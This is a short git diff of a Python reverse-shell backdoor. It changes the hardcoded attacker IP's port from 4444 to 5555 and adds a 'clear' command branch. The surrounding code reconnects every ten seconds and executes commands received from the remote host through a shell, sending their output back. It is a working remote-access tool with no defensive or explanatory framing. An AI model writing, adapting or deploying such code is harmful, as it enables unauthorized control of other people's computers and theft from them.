@@ -5,7 +5,7 @@ import json
 import subprocess
 
 IP = "172.20.10.3"
-PORT = 4444
+PORT = 5555
 def connect(s):
     while(True):
         time.sleep(10)
@@ -35,6 +35,8 @@ def shell(target):
             quit()
         if command[:3] == "cd ":
             os.chdir(command[3:])
+        if command == "clear":
+            pass
         else:
             execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
             result = execution.stdout.read() + execution.stderr.read()
